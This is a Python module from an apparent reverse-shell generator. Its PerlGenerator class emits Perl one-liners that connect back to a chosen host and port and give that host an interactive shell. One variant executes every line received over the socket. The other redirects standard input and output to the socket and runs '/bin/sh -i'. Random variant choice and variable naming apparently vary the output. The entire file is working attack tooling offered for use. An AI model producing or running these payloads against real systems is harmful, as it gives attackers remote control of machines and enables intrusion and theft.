import random
from .base import RandomNamePool, ShellGenerator, ShellResult

_VARIANTS = ["socket_exec", "socket_fork"]


class PerlGenerator(ShellGenerator):
    language = "perl"

    def _generate(self, lhost: str, lport: int, arch: str, names: RandomNamePool | None) -> ShellResult:
        variant = random.choice(_VARIANTS)

        if variant == "socket_exec":
            cmd = self._socket_exec(lhost, lport, names)
        else:
            cmd = self._socket_fork(lhost, lport, names)

        return ShellResult(command=cmd, variant=variant, language=self.language, arch=arch)

    def _socket_exec(self, lhost: str, lport: int, names: RandomNamePool | None) -> str:
        sock = self._var("sock", names)
        return (
            f"perl -e 'use Socket;"
            f"${sock}=IO::Socket::INET->new(PeerAddr=>\"{lhost}\","
            f"PeerPort=>\"{lport}\",Proto=>\"tcp\");"
            f"STDIN->fdopen(${sock},r);$~->fdopen(${sock},w);"
            f"system$_ while<>'"
        )

    def _socket_fork(self, lhost: str, lport: int, names: RandomNamePool | None) -> str:
        return (
            f'perl -e \'use Socket;$i="{lhost}";$p={lport};'
            f'socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));'
            f'if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,">&S");'
            f'open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i")}};\''
        )
